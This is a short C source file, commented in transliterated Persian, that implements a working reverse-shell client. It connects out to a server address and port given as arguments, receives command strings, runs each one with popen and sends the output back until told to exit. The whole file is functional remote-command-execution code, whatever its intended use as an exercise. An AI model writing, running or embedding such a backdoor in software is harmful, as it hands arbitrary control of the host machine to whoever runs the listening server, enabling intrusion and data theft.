#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define BUFFER_SIZE 1024
#define END_MARKER "<EOF>" // neshan payan payam

int main(int argc, char *argv[]) {
    // check port 
    if (argc != 3) {
        fprintf(stderr, "Usage: %s <server_ip> <port>\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    char *server_ip = argv[1];
    int port = atoi(argv[2]);
    int sock_fd;
    struct sockaddr_in server_addr;

    if ((sock_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock_fd);
        exit(EXIT_FAILURE);
    }

    if (connect(sock_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("Connection failed");
        close(sock_fd);
        exit(EXIT_FAILURE);
    }

    char command[BUFFER_SIZE];
    char output_buffer[BUFFER_SIZE];

    while (1) {
        memset(command, 0, BUFFER_SIZE);
        int bytes_received = recv(sock_fd, command, BUFFER_SIZE - 1, 0);
        
        // dar sorat ghati server client ham ghat mishe 
        if (bytes_received <= 0) {
            break;
        }

        if (strcmp(command, "exit") == 0) {
            break;
        }

        // estefade az popen 
        FILE *fp = popen(command, "r");
        if (fp == NULL) {
            char *err_msg = "Failed to execute command\n";
            send(sock_fd, err_msg, strlen(err_msg), 0);
        } else {
            // khandan khoroji va ersalesh baray server 
            memset(output_buffer, 0, BUFFER_SIZE);
            while (fgets(output_buffer, sizeof(output_buffer), fp) != NULL) {
                send(sock_fd, output_buffer, strlen(output_buffer), 0);
                memset(output_buffer, 0, BUFFER_SIZE);
            }
            pclose(fp);
        }

        // neshan payan payama mifrestim 
        send(sock_fd, END_MARKER, strlen(END_MARKER), 0);
    }

    close(sock_fd);
    return 0;
}
